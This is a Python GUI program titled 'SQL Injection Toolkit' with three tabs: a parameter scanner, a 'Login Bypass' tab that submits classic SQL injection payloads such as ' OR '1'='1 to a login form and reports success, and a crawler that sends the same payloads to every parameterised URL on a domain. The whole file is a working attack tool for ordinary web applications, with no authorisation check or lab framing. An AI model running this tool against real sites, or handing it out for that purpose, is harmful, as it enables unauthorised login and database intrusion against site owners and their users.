import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import random
import string
import threading


# ---------- SQL Injection Payloads ----------
sqli_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR ''='",
    "' OR 1=1#"
]

success_keywords = ["dashboard", "logout", "welcome", "profile", "account", "settings"]
visited_links = set()

# ---------- Utility Functions ----------
def is_valid_url(url, domain):
    return domain in url and url.startswith("http")

def extract_links(base_url, html_content):
    soup = BeautifulSoup(html_content, "html.parser")
    links = set()
    for tag in soup.find_all("a", href=True):
        full_url = urljoin(base_url, tag['href'])
        links.add(full_url)
    return links

# ---------- Tab 1: SQLi Scanner ----------
def detect_sql_injection():
    url = sqli_entry.get().strip()
    sqli_output.delete(1.0, tk.END)

    if "?" not in url:
        sqli_output.insert(tk.END, "[!] Invalid URL: Must contain parameters.")
        return

    vulnerable = False
    for payload in sqli_payloads:
        test_url = url.split('=')[0] + '=' + payload
        try:
            r = requests.get(test_url, timeout=5)
            sqli_output.insert(tk.END, f"[+] Tested: {payload}\n")
            if "mysql" in r.text.lower() or "syntax" in r.text.lower() or r.status_code == 500:
                sqli_output.insert(tk.END, "  [!] SQL Error Detected!\n")
                vulnerable = True
        except Exception as e:
            sqli_output.insert(tk.END, f"  [!] Error: {str(e)}\n")

    if vulnerable:
        sqli_output.insert(tk.END, "\n[✔] SQL Injection vulnerability detected.")
    else:
        sqli_output.insert(tk.END, "\n[✘] No vulnerability detected.")

# ---------- Tab 2: Login Bypass ----------
def login_bypass():
    url = login_url_entry.get().strip()
    user_field = username_field_entry.get().strip()
    pass_field = password_field_entry.get().strip()

    if not all([url, user_field, pass_field]):
        messagebox.showwarning("Input Error", "Please fill all fields.")
        return

    login_output.delete(1.0, tk.END)
    session = requests.Session()

    random_user = ''.join(random.choices(string.ascii_lowercase, k=8))
    random_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    baseline_data = {user_field: random_user, pass_field: random_pass}

    try:
        baseline_response = session.post(url, data=baseline_data, timeout=5)
        baseline_text = baseline_response.text
        baseline_len = len(baseline_text)
    except Exception as e:
        login_output.insert(tk.END, f"[!] Failed to get baseline response: {e}\n")
        return

    for payload in sqli_payloads:
        test_data = {user_field: payload, pass_field: payload}
        try:
            response = session.post(url, data=test_data, timeout=5)
            resp_text = response.text
            resp_len = len(resp_text)

            login_output.insert(tk.END, f"[+] Tried: {payload}\n")

            keyword_hits = [kw for kw in success_keywords if kw in resp_text.lower()]
            is_different = abs(resp_len - baseline_len) > 30 or keyword_hits or (response.url != baseline_response.url)

            if is_different:
                login_output.insert(tk.END, f"    [✔] Login bypass success with payload: {payload}\n")
                if keyword_hits:
                    login_output.insert(tk.END, f"    [!] Success keywords found: {', '.join(keyword_hits)}\n")
                if response.url != baseline_response.url:
                    login_output.insert(tk.END, f"    [!] Redirected to: {response.url}\n")
                break
            else:
                login_output.insert(tk.END, "    [✘] Bypass failed.\n")

        except Exception as e:
            login_output.insert(tk.END, f"    [!] Error: {str(e)}\n")

# ---------- Tab 3: Crawler + Scanner ----------
def crawl_and_scan():
    base_url = crawl_entry.get().strip()
    domain = urlparse(base_url).netloc
    crawl_output.delete(1.0, tk.END)

    if not base_url.startswith("http"):
        crawl_output.insert(tk.END, "[!] Enter a valid URL starting with http/https.\n")
        return

    to_visit = set([base_url])
    found_vulnerable = []

    while to_visit:
        current_url = to_visit.pop()
        if current_url in visited_links:
            continue

        try:
            res = requests.get(current_url, timeout=5)
            visited_links.add(current_url)
            crawl_output.insert(tk.END, f"[+] Crawling: {current_url}\n")

            links = extract_links(current_url, res.text)
            to_visit.update(link for link in links if is_valid_url(link, domain))

            if "?" in current_url and "=" in current_url:
                for payload in sqli_payloads:
                    test_url = current_url.split('=')[0] + '=' + payload
                    try:
                        test_res = requests.get(test_url, timeout=5)
                        if "mysql" in test_res.text.lower() or "syntax" in test_res.text.lower() or test_res.status_code == 500:
                            crawl_output.insert(tk.END, f"  [✔] SQLi Vulnerable: {current_url}\n")
                            found_vulnerable.append(current_url)
                            break
                    except:
                        continue

        except Exception as e:
            crawl_output.insert(tk.END, f"[!] Failed to crawl {current_url}: {e}\n")

    if found_vulnerable:
        crawl_output.insert(tk.END, "\n[✔] Vulnerable URLs Found:\n")
        for vurl in found_vulnerable:
            crawl_output.insert(tk.END, f"  {vurl}\n")
    else:
        crawl_output.insert(tk.END, "\n[✘] No vulnerable URLs found during crawl.\n")

# ---------- GUI Setup ----------
root = tk.Tk()
root.title("SQL Injection Toolkit")
root.geometry("880x650")

notebook = ttk.Notebook(root)
notebook.pack(pady=10, expand=True)

# Tab 1: SQLi Scanner
tab1 = ttk.Frame(notebook)
notebook.add(tab1, text="SQLi Scanner")
sqli_entry = tk.Entry(tab1, width=90)
sqli_entry.pack(pady=10)
tk.Button(tab1, text="Scan", command=detect_sql_injection, bg="#4CAF50", fg="white").pack(pady=5)
sqli_output = scrolledtext.ScrolledText(tab1, width=105, height=28)
sqli_output.pack()

# Tab 2: Login Bypass
tab2 = ttk.Frame(notebook)
notebook.add(tab2, text="Login Bypass")
tk.Label(tab2, text="Login Page URL:").pack()
login_url_entry = tk.Entry(tab2, width=80)
login_url_entry.pack()
tk.Label(tab2, text="Username Field Name:").pack()
username_field_entry = tk.Entry(tab2, width=40)
username_field_entry.pack()
tk.Label(tab2, text="Password Field Name:").pack()
password_field_entry = tk.Entry(tab2, width=40)
password_field_entry.pack()
tk.Button(tab2, text="Try Bypass", command=login_bypass, bg="#2196F3", fg="white").pack(pady=5)
login_output = scrolledtext.ScrolledText(tab2, width=105, height=25)
login_output.pack()

# Tab 3: Crawler + Scanner
tab3 = ttk.Frame(notebook)
notebook.add(tab3, text="Crawler + Scanner")
tk.Label(tab3, text="Start URL:").pack()
crawl_entry = tk.Entry(tab3, width=90)
crawl_entry.pack(pady=5)
def start_crawler_thread():
    thread = threading.Thread(target=crawl_and_scan)
    thread.start()

tk.Button(tab3, text="Start Crawl & Scan", command=start_crawler_thread, bg="#FF9800", fg="white").pack(pady=5)
crawl_output = scrolledtext.ScrolledText(tab3, width=105, height=28)
crawl_output.pack()

root.mainloop()